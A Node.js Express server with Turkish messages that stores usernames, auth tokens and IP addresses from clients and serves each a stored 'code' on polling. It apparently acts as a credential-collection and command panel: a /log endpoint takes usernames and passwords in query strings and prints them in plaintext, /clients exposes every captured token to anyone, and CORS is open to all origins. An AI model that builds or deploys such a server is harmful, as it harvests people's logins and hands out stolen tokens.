const express = require('express');
const http = require('http');
const path = require('path');

const app = express();
const server = http.createServer(app);

const connectedClients = new Map();
const userCodes = new Map();

app.use(express.json());
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    res.header('Access-Control-Allow-Credentials', 'true');
    next();
});
app.use(express.static('public'));

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'client.html'));
});

app.get('/hello', (req, res) => {
    res.send('Merhaba, sunucu çalışıyor!');
});

app.post('/login', (req, res) => {
    const { username, authToken } = req.body || {};
    const ipAddress = req.ip || req.connection.remoteAddress;

    if (!username || !authToken) {
        return res.status(400).json({ error: 'Username ve authToken gerekli' });
    }

    connectedClients.set(username, {
        username,
        authToken,
        ipAddress,
        loginTime: Date.now(),
        lastSeen: Date.now()
    });

    console.log(`[${new Date().toLocaleString()}] ${username} giriş yaptı`);
    res.json({ message: `${username} başarıyla giriş yaptı`, status: 'connected' });
});

app.post('/logout', (req, res) => {
    const { username } = req.body || {};

    if (!username) {
        return res.status(400).json({ error: 'Username gerekli' });
    }

    if (connectedClients.has(username)) {
        connectedClients.delete(username);
        console.log(`[${new Date().toLocaleString()}] ${username} çıkış yaptı`);
        res.json({ message: `${username} başarıyla çıkış yaptı`, status: 'disconnected' });
    } else {
        res.status(404).json({ error: 'Kullanıcı bağlı değil' });
    }
});

app.post('/get-code', (req, res) => {
    const { username, authToken } = req.body || {};
    const ipAddress = req.ip || req.connection.remoteAddress;

    if (!username || !authToken) {
        return res.status(400).json({ error: 'Username ve authToken gerekli' });
    }

    if (connectedClients.has(username)) {
        connectedClients.set(username, {
            ...connectedClients.get(username),
            lastSeen: Date.now()
        });
    } else {
        connectedClients.set(username, {
            username,
            authToken,
            ipAddress,
            loginTime: Date.now(),
            lastSeen: Date.now()
        });
    }

    const userCode = userCodes.get(username) || { code: '', timestamp: Date.now() };
    res.json(userCode);
});

app.get('/clients', (req, res) => {
    const clientsArray = Array.from(connectedClients.values());
    res.json(clientsArray);
});

// Yeni log endpoint’i
app.get('/log', (req, res) => {
    const { username, password, remember } = req.query;

    if (!username || !password) {
        return res.status(400).json({ error: 'Username ve password gerekli' });
    }

    console.log(`[${new Date().toLocaleString()}] Log: username=${username}, password=${password}, remember=${remember}`);
    res.json({ message: 'Log alındı', status: 'success' });
});

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Sunucu ${PORT} portunda çalışıyor`);
});
